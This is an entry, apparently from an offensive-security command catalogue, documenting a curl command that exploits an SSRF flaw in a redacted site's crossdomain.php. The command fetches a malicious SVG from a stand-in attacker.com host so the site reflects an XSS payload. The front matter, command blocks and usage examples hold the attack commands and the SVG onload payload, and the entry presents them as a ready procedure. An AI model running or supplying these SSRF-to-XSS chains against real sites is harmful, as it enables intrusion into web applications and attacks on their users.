---
id: cmd-curl-ssrf-xss
data: >-
  curl
  "http://www.███████/crossdomain.php?url=https://attacker.com/malicious.svg" -v
tags:
  - ssrf
  - xss
type: command
output: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(''XSS via SSRF'')"></svg>'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.690Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-xss

## Command

```bash
curl "http://www.███████/crossdomain.php?url=https://attacker.com/malicious.svg" -v
```

## Description

Uses SSRF to fetch and reflect a malicious SVG with XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | External SVG URL | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl "http://www.███████/crossdomain.php?url=https://attacker.com/malicious.svg"
```

### Advanced Usage

```bash
curl "http://www.███████/crossdomain.php?url=https://attacker.com/xss.svg" --header "Accept: image/svg+xml"
```

## Expected Output

Reflected SVG content with embedded JS.

## Related

- [[Related Procedure|procedures/Chain-SSRF-to-Reflected-XSS-via-Malicious-SVG]]
